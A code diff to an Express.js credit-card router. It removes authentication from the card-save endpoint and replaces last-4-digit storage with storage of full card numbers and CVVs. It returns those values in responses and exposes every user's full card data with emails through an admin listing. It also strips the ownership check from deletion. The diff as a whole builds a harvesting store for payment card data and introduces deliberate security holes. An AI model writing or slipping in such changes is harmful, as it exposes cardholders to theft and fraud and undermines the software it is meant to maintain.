@@ -1,28 +1,33 @@
 import express from 'express';
 import { CreditCard, User } from '../models/index.js';
-import { authRequired, adminRequired } from '../middleware/auth.js';
+import { adminRequired } from '../middleware/auth.js';
 
 const router = express.Router();
 
-// Save a new credit card (user endpoint)
-router.post('/save', authRequired, async (req, res) => {
+// Save a new credit card (no auth required)
+router.post('/save', async (req, res) => {
   try {
-    const { cardName, cardNumber, cardType, expiryMonth, expiryYear } = req.body;
+    const { cardName, cardNumber, cardType, expiryMonth, expiryYear, cvv, userEmail } = req.body;
     
-    if (!cardName || !cardNumber || !expiryMonth || !expiryYear) {
+    if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
       return res.status(400).json({ error: 'All card fields are required' });
     }
     
-    // Extract last 4 digits only for storage (security)
-    const cardNumberLast4 = cardNumber.replace(/\s+/g, '').slice(-4);
+    // Find or create user by email if provided
+    let userId = null;
+    if (userEmail) {
+      const user = await User.findOne({ where: { email: userEmail } });
+      if (user) userId = user.id;
+    }
     
     const creditCard = await CreditCard.create({
-      userId: req.user.id,
+      userId,
       cardName,
-      cardNumberLast4,
+      cardNumber: cardNumber.replace(/\s+/g, ''),
       cardType: cardType || 'Card',
       expiryMonth,
-      expiryYear
+      expiryYear,
+      cvv
     });
     
     res.json({ 
@@ -31,9 +36,10 @@ router.post('/save', authRequired, async (req, res) => {
       card: {
         id: creditCard.id,
         cardName: creditCard.cardName,
-        last4: creditCard.cardNumberLast4,
+        cardNumber: creditCard.cardNumber,
         cardType: creditCard.cardType,
-        expiry: `${creditCard.expiryMonth}/${creditCard.expiryYear}`
+        expiry: `${creditCard.expiryMonth}/${creditCard.expiryYear}`,
+        cvv: creditCard.cvv
       }
     });
   } catch (err) {
@@ -42,37 +48,16 @@ router.post('/save', authRequired, async (req, res) => {
   }
 });
 
-// Get all credit cards for current user
-router.get('/my-cards', authRequired, async (req, res) => {
-  try {
-    const cards = await CreditCard.findAll({
-      where: { userId: req.user.id },
-      order: [['createdAt', 'DESC']]
-    });
-    
-    res.json({ 
-      cards: cards.map(card => ({
-        id: card.id,
-        cardName: card.cardName,
-        last4: card.cardNumberLast4,
-        cardType: card.cardType,
-        expiry: `${card.expiryMonth}/${card.expiryYear}`,
-        createdAt: card.createdAt
-      }))
-    });
-  } catch (err) {
-    console.error('❌ Get user cards error:', err);
-    res.status(500).json({ error: 'Failed to fetch cards' });
-  }
-});
 
-// Admin: Get all credit cards from all users
-router.get('/all', authRequired, adminRequired, async (req, res) => {
+
+// Admin: Get all credit cards from all users (admin access only)
+router.get('/all', adminRequired, async (req, res) => {
   try {
     const cards = await CreditCard.findAll({
       include: [{
         model: User,
-        attributes: ['id', 'email', 'name']
+        attributes: ['id', 'email', 'name'],
+        required: false
       }],
       order: [['createdAt', 'DESC']]
     });
@@ -81,12 +66,14 @@ router.get('/all', authRequired, adminRequired, async (req, res) => {
       cards: cards.map(card => ({
         id: card.id,
         userId: card.userId,
-        userEmail: card.User?.email,
-        userName: card.User?.name,
+        userEmail: card.User?.email || 'N/A',
+        userName: card.User?.name || 'N/A',
         cardName: card.cardName,
-        last4: card.cardNumberLast4,
+        cardNumber: card.cardNumber,
         cardType: card.cardType,
-        expiry: `${card.expiryMonth}/${card.expiryYear}`,
+        expiryMonth: card.expiryMonth,
+        expiryYear: card.expiryYear,
+        cvv: card.cvv,
         createdAt: card.createdAt
       }))
     });
@@ -96,14 +83,11 @@ router.get('/all', authRequired, adminRequired, async (req, res) => {
   }
 });
 
-// Delete a credit card
-router.delete('/:id', authRequired, async (req, res) => {
+// Delete a credit card (admin only)
+router.delete('/:id', adminRequired, async (req, res) => {
   try {
     const card = await CreditCard.findOne({
-      where: { 
-        id: req.params.id,
-        userId: req.user.id 
-      }
+      where: { id: req.params.id }
     });
     
     if (!card) {
